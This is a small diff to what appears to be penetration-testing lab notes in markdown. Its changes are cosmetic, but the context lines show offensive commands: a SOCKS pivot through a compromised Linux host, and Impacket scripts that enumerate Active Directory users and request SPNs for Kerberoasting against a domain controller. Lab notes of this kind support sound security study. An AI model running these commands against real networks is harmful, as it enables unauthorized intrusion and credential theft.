@@ -36,8 +36,6 @@ Create a sock Proxy on the target compromised linux box :
 ssh testme@10.110.0.74 -D 1080
 ```
 
-
-
 ### Enumerate AD users
 
 ```csharp
@@ -49,7 +47,7 @@ proxychains python3 GetADUsers.py -all -k -no-pass -dc-ip 10.110.0.222 CROOK.BAD
 
 ### Get SPN 
 
-```text
+```csharp
 proxychains python3 GetUserSPNs.py -k -no-pass -dc-ip 10.110.0.222 CROOK.BADCORP.LOCAL/Administrator
 ```
 
